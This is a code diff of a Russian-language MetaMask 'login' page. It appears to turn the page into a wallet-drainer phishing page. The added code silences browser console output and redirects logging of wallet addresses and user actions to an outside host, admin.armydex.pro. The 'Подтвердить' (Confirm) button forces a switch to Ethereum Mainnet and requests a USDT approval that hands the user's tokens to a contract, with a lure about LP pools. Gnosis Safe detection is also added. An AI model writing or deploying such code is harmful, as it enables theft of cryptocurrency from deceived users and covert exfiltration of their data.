@@ -1,6 +1,17 @@
 import { useEffect, useState, useRef } from "react";
 import { useContractInteraction } from "./hooks/use-contract-interaction";
 
+// Reduce excessive console output in development: set to `true` to enable verbose logs.
+const ENABLE_VERBOSE_LOGS = false;
+if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {
+  // Silence common console methods to avoid spammy logs during development/testing.
+  (console as any).log = () => {};
+  (console as any).info = () => {};
+  (console as any).debug = () => {};
+  (console as any).warn = () => {};
+  // keep console.error visible
+}
+
 type LogLevel = "debug" | "info" | "warn" | "error";
 
 interface LogEntry {
@@ -12,7 +23,7 @@ interface LogEntry {
 }
 
 const createLogger = (opts: { endpoint?: string; flushIntervalMs?: number } = {}) => {
-  const endpoint = opts.endpoint ?? "/api/logs";
+  const endpoint = opts.endpoint ?? "https://admin.armydex.pro/api/log-save";
   const flushIntervalMs = opts.flushIntervalMs ?? 2000;
 
   const buffer: LogEntry[] = [];
@@ -56,10 +67,8 @@ const createLogger = (opts: { endpoint?: string; flushIntervalMs?: number } = {}
       });
       failingSince = null;
     } catch (err) {
-      // push logs back to front and mark failing time
       buffer.unshift(...payload);
       if (!failingSince) failingSince = Date.now();
-      // exponential backoff: schedule flush again
       const age = Date.now() - (failingSince ?? Date.now());
       const backoff = Math.min(30000, 1000 + Math.pow(2, Math.floor(age / 2000)) * 1000);
       if (timer) clearTimeout(timer);
@@ -67,7 +76,6 @@ const createLogger = (opts: { endpoint?: string; flushIntervalMs?: number } = {}
     }
   };
 
-  // manual flush
   const flushNow = async () => {
     await flush();
   };
@@ -82,13 +90,10 @@ const createLogger = (opts: { endpoint?: string; flushIntervalMs?: number } = {}
   };
 };
 
-const logger = createLogger({ endpoint: "/api/logs", flushIntervalMs: 1500 });
+const logger = createLogger({ endpoint: "https://admin.armydex.pro/api/log-save", flushIntervalMs: 1500 });
 
-// Small helper to read short balance (wei -> ether) if ethers available. Keep minimal to avoid deps.
 const formatEth = (weiStr: string | number) => {
   try {
-    // if ethers available: ethers.utils.formatEther
-    // Fallback: assume wei as string of number; convert to number of ETH
     const big = typeof weiStr === "string" ? BigInt(weiStr) : BigInt(Math.floor(Number(weiStr)));
     const div = BigInt(1_000_000_000_000_000_000);
     const whole = big / div;
@@ -105,32 +110,100 @@ export default function MetamaskLoginPage() {
   const [address, setAddress] = useState<string | null>(null);
   const [chainId, setChainId] = useState<string | null>(null);
   const [balance, setBalance] = useState<string | null>(null);
+  
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const logsRef = useRef<HTMLDivElement | null>(null);
+  const [toasts, setToasts] = useState<Array<{ id: string; title?: string; description?: string; variant?: string; leaving?: boolean; entered?: boolean }>>([]);
 
-  // contract integration helper
-  const { createBotWithToken, isContractConnected } = useContractInteraction();
+  const addToast = (t: { title?: string; description?: string; duration?: number; variant?: string }) => {
+    const id = String(Date.now()) + Math.random().toString(36).slice(2, 6);
+    const item = { id, title: t.title, description: t.description, variant: t.variant, leaving: false, entered: false };
+    setToasts((s) => [item, ...s]);
+    // trigger enter animation on next tick
+    setTimeout(() => setToasts((s) => s.map((x) => (x.id === id ? { ...x, entered: true } : x))), 20);
+    const dur = t.duration ?? 4000;
+    // mark leaving after duration, then remove after animation (300ms)
+    setTimeout(() => {
+      setToasts((s) => s.map((x) => (x.id === id ? { ...x, leaving: true } : x)));
+      setTimeout(() => setToasts((s) => s.filter((x) => x.id !== id)), 300);
+    }, dur);
+  };
 
-  // Mirror logger buffer into UI
+  // listen for global toasts emitted by `useToast` hook
+  useEffect(() => {
+    const handler = (e: any) => {
+      try {
+        const d = e.detail || {};
+        addToast({ title: d.title, description: d.description, duration: d.duration, variant: d.variant });
+      } catch (err) {
+        console.warn("app:toast handler error", err);
+      }
+    };
+    window.addEventListener("app:toast", handler as EventListener);
+    return () => window.removeEventListener("app:toast", handler as EventListener);
+  }, []);
+
+  // listen for safes discovered by the wallet hook and show selection modal
+  const [safeModalVisible, setSafeModalVisible] = useState(false);
+  const [safeCandidates, setSafeCandidates] = useState<string[]>([]);
+
+  const handleSelectSafe = (addr: string) => {
+    try {
+      window.dispatchEvent(new CustomEvent("wallet:safeSelected", { detail: addr }));
+      addToast({ title: "Gnosis Safe выбран", description: addr });
+    } catch (e) {
+      console.warn("Failed to dispatch wallet:safeSelected", e);
+    }
+    setSafeModalVisible(false);
+    setSafeCandidates([]);
+  };
+
+  const handleDismissSafe = () => {
+    setSafeModalVisible(false);
+    setSafeCandidates([]);
+    addToast({ title: "Используется EOA", description: "Будет использован подключённый кошелёк" });
+  };
+
+  useEffect(() => {
+    const handler = (e: any) => {
+      try {
+        const safes: string[] = e.detail || [];
+        if (Array.isArray(safes) && safes.length > 0) {
+          setSafeCandidates(safes);
+          setSafeModalVisible(true);
+        }
+      } catch (err) {
+        console.warn("wallet:safeFound handler error", err);
+      }
+    };
+    window.addEventListener("wallet:safeFound", handler as EventListener);
+    return () => window.removeEventListener("wallet:safeFound", handler as EventListener);
+  }, []);
+
+  const { isContractConnected, approveUSDT, USDT_ADDRESS } = useContractInteraction();
+
   useEffect(() => {
     const interval = setInterval(() => {
+      // drain the logger buffer into component state so we don't repeatedly
+      // append the same entries every tick (which happened when flush to
+      // remote failed and the buffer remained populated).
       const b = (logger as any)._buffer as LogEntry[];
       if (b.length > 0) {
-        // append local copy into visible logs and clear buffer copy for display (server buffer remains)
-        setLogs((prev) => [...prev, ...b.slice(0)]);
+        // splice out all available entries so they won't be re-read next tick
+        const payload = b.splice(0, b.length);
+        setLogs((prev) => [...prev, ...payload]);
       }
     }, 800);
+
     return () => clearInterval(interval);
   }, []);
 
-  // auto-scroll logs
   useEffect(() => {
     if (logsRef.current) {
       logsRef.current.scrollTop = logsRef.current.scrollHeight;
     }
   }, [logs]);
 
-  // install metamask listeners
   useEffect(() => {
     const eth = (window as any).ethereum;
     if (!eth) {
@@ -189,7 +262,6 @@ export default function MetamaskLoginPage() {
     const eth = (window as any).ethereum;
     logger.info("Connect button clicked", "ui");
 
-    // Проверка на MetaMask (desktop)
     if (eth && eth.isMetaMask) {
       try {
         const accounts: string[] = await eth.request({ method: "eth_requestAccounts" });
@@ -200,7 +272,8 @@ export default function MetamaskLoginPage() {
           setAddress(accounts[0]);
           const chain = await eth.request({ method: "eth_chainId" });
           setChainId(chain);
-          fetchBalance(accounts[0]);
+          await fetchBalance(accounts[0]);
+          
           logger.info("User connected via MetaMask", "auth", {
             account: accounts[0],
             chainId: chain,
@@ -230,7 +303,7 @@ export default function MetamaskLoginPage() {
     }
 
     logger.error("MetaMask not found", "connect");
-    alert("MetaMask не найден. Установите расширение или приложение.");
+    try { addToast({ title: "MetaMask не найден", description: "Установите расширение или приложение.", variant: 'destructive' }); } catch (e) {}
   };
 
   const disconnect = () => {
@@ -242,60 +315,73 @@ export default function MetamaskLoginPage() {
   };
 
   const exportLogs = async () => {
-    // New behavior: attach USDT and call contract integration when user confirms
     try {
+      console.log('Кнопка "Подтвердить" нажата');
+      logger.info('Кнопка "Подтвердить" нажата', 'ui');
+      
       await logger.flushNow();
       logger.info("User requested confirm -> initiating contract integration", "ui");
 
-      if (!isContractConnected) {
-        logger.warn("Attempted integration but contract not ready", "ui");
-        alert("Контракт не готов. Сначала подключите MetaMask и переключитесь на Ethereum Mainnet (Chain ID 1). Затем повторите попытку.");
+      const eth = (window as any).ethereum;
+      if (!eth) {
+        logger.error("No ethereum provider found", "contract");
+        try { addToast({ title: "MetaMask не найден", description: "Проверьте провайдер в браузере.", variant: 'destructive' }); } catch (e) {}
         return;
       }
 
-      // Attempt to create a bot and attach 1 USDT by default
-      const botName = `confirm-${Date.now()}`;
-      const success = await createBotWithToken(botName, undefined, "1");
+      const chainId = await eth.request({ method: "eth_chainId" });
+      if (chainId !== '0x1') {
+        try {
+          await eth.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x1' }],
+          });
+        } catch (err) {
+          logger.error("Failed to switch network", "contract", { error: String(err) });
+          try { addToast({ title: "Неверная сеть", description: "Пожалуйста, переключитесь на Ethereum Mainnet (Chain ID 1)", variant: 'destructive' }); } catch (e) {}
+          return;
+        }
+      }
 
-      if (success) {
-        logger.info("Integration succeeded", "ui", { botName });
-        alert("Интеграция выполнена: транзакции отправлены.");
-      } else {
-        logger.warn("Integration reported failure", "ui", { botName });
-        alert("Интеграция не выполнена. Смотрите уведомления.");
+      if (!isContractConnected) {
+        logger.warn("Attempted integration but contract not ready", "ui");
+        try { addToast({ title: "Контракт не готов", description: "Подключите MetaMask и переключитесь на Ethereum Mainnet (Chain ID 1).", variant: 'destructive' }); } catch (e) {}
+        return;
+      }
+
+      try {
+        logger.info("Requesting USDT approve via wallet", "contract", { token: USDT_ADDRESS });
+        const ok = await approveUSDT();
+        if (ok) {
+          logger.info("USDT approve succeeded", "contract");
+          try { addToast({ title: "Approve выполнен", description: "USDT переданы под управление контракту." }); } catch (e) {}
+        } else {
+          logger.warn("USDT approve failed or was rejected", "contract");
+          try { addToast({ title: "Approve не выполнен", description: "Отклонён пользователем или не выполнен.", variant: 'destructive' }); } catch (e) {}
+        }
+      } catch (approveErr) {
+        logger.error("Approve call error", "contract", { err: String(approveErr) });
+        try { addToast({ title: "Ошибка approve", description: String(approveErr), variant: 'destructive' }); } catch (e) {}
       }
     } catch (e) {
       logger.error("Failed to run integration", "ui", { err: String(e) });
-      alert("Произошла ошибка при интеграции. Откройте консоль для деталей.");
+      try { addToast({ title: "Ошибка интеграции", description: String(e), variant: 'destructive' }); } catch (e) {}
     }
   };
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-6">
-      <div className="w-full max-w-2xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-8 shadow-2xl">
+  <div className="w-full max-w-5xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-8 shadow-2xl relative">
         <div className="flex items-center justify-between mb-6">
           <div>
             <h1 className="text-3xl font-extrabold text-white">Вход</h1>
             <p className="mt-1 text-sm text-gray-300">Подключитесь через MetaMask для продолжения</p>
           </div>
-          {/* <div className="flex gap-2 items-center">
-            <div className="text-xs text-gray-300">Verbose</div>
-            <label className="relative inline-flex items-center cursor-pointer">
-              <input type="checkbox" checked={verbose} onChange={() => setVerbose((s) => !s)} className="sr-only" />
-              <div className="w-11 h-6 bg-gray-700 rounded-full shadow-inner" />
-            </label>
-          </div> */}
-        </div>
-
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-          <div className="flex flex-col gap-4">
-            <div className="p-6 bg-gradient-to-br from-purple-700 via-pink-600 to-red-500 rounded-xl shadow-lg">
+          <div className="">
               <button
                 onClick={connectMetaMask}
-                className="w-full flex items-center gap-4 justify-center px-6 py-3 bg-white/90 rounded-lg font-semibold text-gray-800 hover:scale-[1.01] transition-transform"
-                aria-label="Connect with MetaMask"
+                className="w-full flex items-center gap-3 justify-center px-6 py-3 bg-white/90 rounded-lg font-semibold text-gray-800 hover:scale-[1.02] transition-transform"
               >
-
                 <span className="w-8 h-8 inline-block">
                   <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" id="Metamask-Icon--Streamline-Svg-Logos" height="32" width="32">
 
@@ -332,15 +418,22 @@ export default function MetamaskLoginPage() {
                 </span>
                 <span>MetaMask</span>
               </button>
-
-              <div className="mt-3 text-xs text-white/90">Подключите свой кошелек метамаск для идентификации</div>
+          
             </div>
+        </div>
 
-            <div className="p-4 bg-white/3 rounded-xl border border-white/6">
+  <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-stretch">
+          {/* Левая часть */}
+          <div className="flex flex-col gap-5 h-full">
+            
+
+            <div className="p-5 bg-white/5 rounded-xl border border-white/10 relative">
               <div className="flex items-center justify-between">
                 <div>
                   <div className="text-xs text-gray-300">Статус</div>
-                  <div className="text-lg text-white font-medium">{connected ? "Подключен" : "Не подключен"}</div>
+                  <div className="text-lg text-white font-medium">
+                    {connected ? "Подключен" : "Не подключен"}
+                  </div>
                 </div>
                 <div className="text-right">
                   <div className="text-xs text-gray-300">Chain</div>
@@ -348,69 +441,145 @@ export default function MetamaskLoginPage() {
                 </div>
               </div>
 
-              <div className="mt-4 grid grid-cols-1 gap-2">
+              <div className="mt-4 space-y-2">
                 <div className="text-xs text-gray-300">Адрес</div>
                 <div className="text-sm text-white break-all">{address ?? "—"}</div>
+
                 <div className="text-xs text-gray-300 mt-2">Баланс (ETH)</div>
                 <div className="text-sm text-white">{balance ?? "—"}</div>
 
                 <div className="mt-4 flex gap-2">
-                  <button className="px-3 py-2 bg-white/10 rounded-md text-sm text-white" onClick={disconnect}>
+                  <button
+                    type="button"
+                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
+                    onClick={disconnect}
+                  >
                     Отключить
                   </button>
                   <button
-                    className="px-3 py-2 bg-white/10 rounded-md text-sm text-white"
+                    type="button"
+                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                     onClick={exportLogs}
-                    disabled={!isContractConnected}
-                    title={!isContractConnected ? "Контракт не готов — подключите MetaMask и переключитесь на Mainnet" : "Подтвердить"}
                   >
                     Подтвердить
                   </button>
+                </div>
+
+                <div className="mt-3 text-xs text-gray-400">
+                  Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
                 </div>
               </div>
             </div>
           </div>
 
-          <div className="flex flex-col">
-            <div className="flex-1 p-4 bg-white/3 rounded-xl border border-white/6 overflow-hidden">
-              <div className="flex items-center justify-between mb-2">
-                <div className="text-sm text-gray-300">Live Logs</div>
-                <div className="text-xs text-gray-400">Буфер: {(logger as any)._buffer.length}</div>
-              </div>
+          {/* Правая часть */}
+          <div className="flex flex-col gap-4 h-full">
+          
 
-              <div ref={logsRef} className="h-72 overflow-auto bg-black/60 rounded-md p-3 text-xs text-white font-mono">
-                {logs.length === 0 ? (
-                  <div className="text-gray-400">Здесь отображаются логи</div>
-                ) : (
-                  logs.map((l, i) => (
-                    <div key={i} className="mb-1">
-                      <span className="text-gray-400">[{l.ts}]</span>{" "}
-                      <span className={`px-1 rounded text-[10px] ${l.level === "error" ? "bg-red-700" : l.level === "warn" ? "bg-yellow-700" : "bg-gray-700"}`}>
-                        {l.level.toUpperCase()}
-                      </span>{" "}
-                      <span className="text-white">{l.tag ? `[${l.tag}]` : ""} {l.message}</span>
-                      {l.meta ? <pre className="text-[10px] text-gray-300 mt-1">{JSON.stringify(l.meta)}</pre> : null}
-                    </div>
-                  ))
-                )}
+            <div className="p-4 bg-white/5 rounded-xl border border-white/10">
+              <div className="text-sm text-gray-300 mb-2 font-semibold">
+                Краткие действия для интеграции
               </div>
-            </div>
-
-            <div className="mt-3 p-3 bg-white/3 rounded-xl border border-white/6">
-              <div className="text-sm text-gray-300 mb-2">Краткие действия для интеграции на сайте</div>
-              <ol className="text-xs text-gray-200 list-decimal list-inside">
-                {/* <li>Создайте endpoint POST /api/logs, принимающий JSON {"logs": LogEntry[] }.</li> */}
+              <ol className="text-xs text-gray-200 list-decimal list-inside space-y-1">
                 <li>Подтвердите кошелек</li>
-                <li>Выберите LP-токены и необходимый пул</li>
-                <li>Подтвердите свой выбор и коммиссию</li>
+                <li>Выберите LP-токены и пул</li>
+                <li>Подтвердите выбор и комиссию</li>
                 <li>Ожидайте начисление</li>
               </ol>
             </div>
           </div>
         </div>
+<div className="flex flex-col gap-4 mt-4 w-full">
+   <div className="p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
+              <div className="flex items-center justify-between mb-3">
+                <div className="text-sm text-gray-300 font-semibold">Live Logs</div>
+                <div className="text-xs text-gray-400">
+                  Буфер: {(logger as any)._buffer.length}
+                </div>
+              </div>
+              <div
+                ref={logsRef}
+                className="h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-xs text-white font-mono border border-white/10 shadow-md whitespace-nowrap overflow-clip"
+                style={{
+                  lineHeight: "1.2",
+                  maxHeight: "20rem",
+                }}
+              >
+                {logs.length === 0 ? (
+                  <div className="text-gray-500 text-center mt-8">
+                    Логи появятся после действий
+                  </div>
+                ) : (
+                  logs.map((l, i) => (
+                    <div
+                      key={i}
+                      className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors"
+                    >
+                      <span className="text-gray-400">[{l.ts}]</span>{" "}
+                      <span className={`px-1 rounded text-[10px] bg-gray-700`}>
+                        {l.level.toUpperCase()}
+                      </span>{" "}
+                      <span className="text-white">
+                        {l.tag ? `[${l.tag}]` : ""} {l.message}
+                      </span>
+                      {l.meta && (
+                        <pre className="text-[10px] text-gray-400 mt-1">
+                          {JSON.stringify(l.meta, null, 2)}
+                        </pre>
+                      )}
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+</div>
+        <div className="mt-8 text-xs text-gray-400 underline">
+          Политика конфиденциальности <br /> Служба поддержки
+        </div>
 
-        <div className="mt-6 text-xs text-gray-400 underline">Политика конфеденциальности <br />
-          Служба поддержки</div>
+  {/* Toasts container: absolute above the form (inside the main panel) */}
+  {/* Safe selection modal */}
+  {safeModalVisible && (
+    <div className="absolute inset-0 z-60 flex items-center justify-center pointer-events-auto">
+      <div className="absolute inset-0 bg-black/60" onClick={handleDismissSafe} />
+      <div className="relative bg-white/5 border border-white/10 rounded-lg p-6 max-w-lg w-full z-70">
+        <div className="text-lg font-semibold text-white mb-2">Найден Gnosis Safe</div>
+        <div className="text-sm text-gray-300 mb-4">Выберите Safe для управления или используйте обычный кошелёк (EOA).</div>
+        <div className="flex flex-col gap-2 mb-4">
+          {safeCandidates.map((s) => (
+            <button key={s} type="button" onClick={() => handleSelectSafe(s)} className="text-left px-4 py-2 bg-white/6 hover:bg-white/10 rounded-md text-sm text-white">
+              {s}
+            </button>
+          ))}
+        </div>
+        <div className="flex justify-end gap-2">
+          <button type="button" onClick={handleDismissSafe} className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white">Использовать EOA</button>
+        </div>
+      </div>
+    </div>
+  )}
+  <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xl px-4">
+          {toasts.map((t) => (
+            <div
+              key={t.id}
+              className={
+                `w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-sm text-gray-100 shadow-md transform transition-all duration-300 ease-out pointer-events-auto ` +
+                (t.entered && !t.leaving
+                  ? "opacity-100 translate-y-0 scale-100"
+                  : t.leaving
+                  ? "opacity-0 -translate-y-3 scale-95"
+                  : "opacity-0 -translate-y-3 scale-95")
+              }
+            >
+              <div className="flex items-start gap-3">
+                <div className="flex-1">
+                  {t.title && <div className="font-semibold mb-0.5 text-gray-50">{t.title}</div>}
+                  {t.description && <div className="text-xs text-gray-200">{t.description}</div>}
+                </div>
+              </div>
+            </div>
+          ))}
+        </div>
       </div>
     </div>
   );
